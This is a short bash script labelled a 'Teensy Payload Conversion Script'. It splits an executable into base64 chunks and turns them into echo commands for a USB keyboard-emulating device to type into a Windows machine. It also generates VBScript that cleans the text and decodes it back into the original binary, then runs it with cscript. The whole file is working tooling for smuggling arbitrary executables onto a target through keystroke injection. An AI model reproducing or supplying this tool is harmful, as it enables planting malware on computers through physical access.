#!/bin/bash

# Teensy Payload Conversion Script
# Converts an executable file into base64 chunks suitable for use with a Teensy, 
# generating scripts for reassembling the file and unpacking it.

echo -e "Made By Taylor Christian Newsome"

if [ -z "$1" ]; then
    echo -e "\n[*] Teensy Payload Conversion Script"
    echo -e "[*] Converts a binary file for Teensy use.\n"
    echo -e "Usage: $0 <file.exe>\n"
    exit 1
fi

# Variables
INPUT_FILE="$1"
BASE_NAME=$(basename "$INPUT_FILE" | cut -d"." -f1)
OUTPUT_DIR="converted"

# Create output directory
mkdir -p "$OUTPUT_DIR"
echo "[*] Converting $INPUT_FILE into base64 format..."
base64 "$INPUT_FILE" > "$OUTPUT_DIR/zip.txt"

# Split base64 file into 8KB chunks
cd "$OUTPUT_DIR"
echo "[*] Splitting base64 file into 8KB chunks..."
split -b 8000 zip.txt part_

# Generate text files with "echo" commands for Teensy typing
n=0
echo > "${BASE_NAME}.txt"
for part in part_*; do
    sed 's/^/echo /' "$part" | sed 's/$/>>file.txt/' > "${BASE_NAME}${n}.txt"
    ((n++))
done

# Create remove.txt (VBScript for cleaning up the base64 file)
cat <<EOF > remove.txt
echo Const ForReading = 1 > remove.vbs
echo Const ForWriting = 2 >> remove.vbs
echo Set objFSO = CreateObject("Scripting.FileSystemObject") >> remove.vbs
echo Set objFile = objFSO.OpenTextFile("file.txt", ForReading) >> remove.vbs
echo strText = objFile.ReadAll >> remove.vbs
echo objFile.Close >> remove.vbs
echo strNewText = Replace(strText, chr(032), "") >> remove.vbs
echo strNewText1 = Replace(strNewText, chr(013), "") >> remove.vbs
echo strNewText2 = Replace(strNewText1, chr(010), "") >> remove.vbs
echo Set objFile = objFSO.OpenTextFile("file.txt", ForWriting) >> remove.vbs
echo objFile.WriteLine strNewText2 >> remove.vbs
echo objFile.Close >> remove.vbs
EOF

# Create unpack.txt (VBScript for decoding base64 into binary)
cat <<EOF > unpack.txt
echo Option Explicit:Dim arguments, inFile, outFile:Set arguments = WScript.Arguments:inFile = arguments(0):outFile = arguments(1):Dim base64Encoded, base64Decoded, outByteArray:dim objFS:dim objTS:set objFS = CreateObject("Scripting.FileSystemObject"):set objTS = objFS.OpenTextFile(inFile, 1):base64Encoded = objTS.ReadAll:base64Decoded = decodeBase64(base64Encoded):writeBytes outFile, base64Decoded:private function decodeBase64(base64):dim DM, EL:Set DM = CreateObject("Microsoft.XMLDOM"):Set EL = DM.createElement("tmp"):EL.DataType = "bin.base64":EL.Text = base64:decodeBase64 = EL.NodeTypedValue:end function:private Sub writeBytes(file, bytes):Dim binaryStream:Set binaryStream = CreateObject("ADODB.Stream"):binaryStream.Type = 1:binaryStream.Open:binaryStream.Write bytes:binaryStream.SaveToFile file, 2:End Sub > unpack.vbs
EOF

# Finalize the main script
echo "cscript remove.vbs" >> "${BASE_NAME}.txt"
echo "cscript unpack.vbs file.txt $INPUT_FILE" >> "${BASE_NAME}.txt"

# Convert files to DOS format for compatibility
unix2dos *.txt 2>/dev/null
rm -f zip.txt part_*

echo "[*] Conversion complete. Files are in the '$OUTPUT_DIR' directory."
